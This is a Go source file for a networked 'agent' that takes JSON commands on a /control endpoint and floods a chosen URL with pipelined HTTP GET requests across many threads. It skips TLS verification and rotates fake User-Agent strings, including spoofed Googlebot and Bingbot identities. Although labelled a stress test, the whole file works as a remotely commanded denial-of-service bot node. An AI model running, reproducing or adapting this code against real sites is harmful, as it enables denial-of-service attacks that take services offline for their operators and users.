package main

import (
	"context"
	"crypto/tls"
	"encoding/json"
	"fmt"
	"math/rand"
	"net"
	"net/http"
	"net/url"
	"strconv"
	"sync"
	"time"
)

type Command struct {
	Action  string `json:"action"`
	URL     string `json:"url"`
	Threads int    `json:"threads"`
	Timer   int    `json:"timer"`
	Cookie  string `json:"cookie"`
}

var (
	ip         string
	port       int
	path       string
	cookie     string
	activeTest bool
	cancelFunc context.CancelFunc
	mu         sync.Mutex

	choice  = []string{"Macintosh", "Windows", "X11"}
	choice2 = []string{"68K", "PPC", "Intel Mac OS X"}
	choice3 = []string{"WinNT4.0", "Windows NT 10.0; Win64; x64", "Windows XP", "Windows 7", "Windows 8"}
	choice4 = []string{"Linux i686", "Linux x86_64"}
	choice5 = []string{"chrome", "firefox", "edge", "safari", "spider"}
	choice6 = []string{".NET CLR", "Win64; x64", "WOW64"}
	spider  = []string{
		"Googlebot/2.1", "AdsBot-Google", "Bingbot", "Yahoo! Slurp", "DuckDuckBot",
	}
)

func init() {
	rand.Seed(time.Now().UnixNano())
}

func getUserAgent() string {
	platform := choice[rand.Intn(len(choice))]
	var os string
	if platform == "Macintosh" {
		os = choice2[rand.Intn(len(choice2))]
	} else if platform == "Windows" {
		os = choice3[rand.Intn(len(choice3))]
	} else {
		os = choice4[rand.Intn(len(choice4))]
	}

	browser := choice5[rand.Intn(len(choice5))]
	switch browser {
	case "chrome":
		version := fmt.Sprintf("%d.0.%d.%d", rand.Intn(99), rand.Intn(9999), rand.Intn(999))
		return fmt.Sprintf("Mozilla/5.0 (%s) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/%s Safari/537.36", os, version)
	case "firefox":
		version := fmt.Sprintf("%d.0", rand.Intn(99))
		return fmt.Sprintf("Mozilla/5.0 (%s; rv:%s) Gecko/20100101 Firefox/%s", os, version, version)
	case "edge":
		version := fmt.Sprintf("%d.0.%d.%d", rand.Intn(99), rand.Intn(9999), rand.Intn(999))
		return fmt.Sprintf("Mozilla/5.0 (%s) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/%s Safari/537.36 Edge/%s", os, version, version)
	default:
		return spider[rand.Intn(len(spider))]
	}
}

func getHeader() string {
	header := fmt.Sprintf("GET %s HTTP/1.1\r\n", path)
	header += fmt.Sprintf("Host: %s\r\n", ip)
	header += fmt.Sprintf("User-Agent: %s\r\n", getUserAgent())
	header += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
	header += "Connection: keep-alive\r\n\r\n"
	return header
}

func sendBatchRequests(conn net.Conn, header string, batchSize int) error {
	for i := 0; i < batchSize; i++ {
		if _, err := conn.Write([]byte(header)); err != nil {
			return err
		}
	}
	return nil
}

func worker(ctx context.Context, id int, wg *sync.WaitGroup, batchSize int) {
	defer wg.Done()

	tlsConfig := &tls.Config{InsecureSkipVerify: true}
	address := fmt.Sprintf("%s:%d", ip, port)

	conn, err := func() (net.Conn, error) {
		if port == 443 {
			return tls.Dial("tcp", address, tlsConfig)
		}
		return net.Dial("tcp", address)
	}()
	if err != nil {
		fmt.Printf("Worker %d: connection error: %v\n", id, err)
		return
	}
	defer conn.Close()

	header := getHeader()
	for {
		select {
		case <-ctx.Done():
			return
		default:
			if err := sendBatchRequests(conn, header, batchSize); err != nil {
				fmt.Printf("Worker %d: error sending requests: %v\n", id, err)
				return
			}
			time.Sleep(time.Millisecond * time.Duration(rand.Intn(50)+10)) // Delay: 10ms–60ms
		}
	}
}

func workerPool(ctx context.Context, threads, batchSize int) {
	var wg sync.WaitGroup
	for i := 0; i < threads; i++ {
		wg.Add(1)
		go worker(ctx, i, &wg, batchSize)
	}
	wg.Wait()
}

func startTest(urlStr string, threads, timer int, cookieStr string) {
	parsedURL, err := url.Parse(urlStr)
	if err != nil {
		fmt.Println("Invalid URL:", err)
		return
	}

	ip = parsedURL.Hostname()
	if parsedURL.Port() != "" {
		port, _ = strconv.Atoi(parsedURL.Port())
	} else if parsedURL.Scheme == "https" {
		port = 443
	} else {
		port = 80
	}

	path = parsedURL.Path
	if path == "" {
		path = "/"
	}
	cookie = cookieStr

	fmt.Printf("Starting stress test on %s:%d%s with %d threads for %d seconds\n", ip, port, path, threads, timer)

	ctx, cancel := context.WithTimeout(context.Background(), time.Duration(timer)*time.Second)
	cancelFunc = cancel

	workerPool(ctx, threads, 200) // Threads with batch size 10
	fmt.Println("Stress test completed.")
	mu.Lock()
	activeTest = false
	mu.Unlock()
}

func controlHandler(w http.ResponseWriter, r *http.Request) {
	var cmd Command
	if err := json.NewDecoder(r.Body).Decode(&cmd); err != nil {
		http.Error(w, "Invalid command format", http.StatusBadRequest)
		return
	}

	if cmd.Action == "start" && !activeTest {
		mu.Lock()
		activeTest = true
		mu.Unlock()

		go startTest(cmd.URL, cmd.Threads, cmd.Timer, cmd.Cookie)
		w.Write([]byte("Test started"))
		return
	}

	http.Error(w, "Invalid or conflicting command", http.StatusConflict)
}

func statusHandler(w http.ResponseWriter, r *http.Request) {
	mu.Lock()
	defer mu.Unlock()

	status := "Ready"
	if activeTest {
		status = "Sending"
	}

	json.NewEncoder(w).Encode(map[string]string{"status": status})
}

func main() {
	http.HandleFunc("/control", controlHandler)
	http.HandleFunc("/status", statusHandler)
	fmt.Println("Agent is running on port 8081")
	http.ListenAndServe(":8081", nil)
}
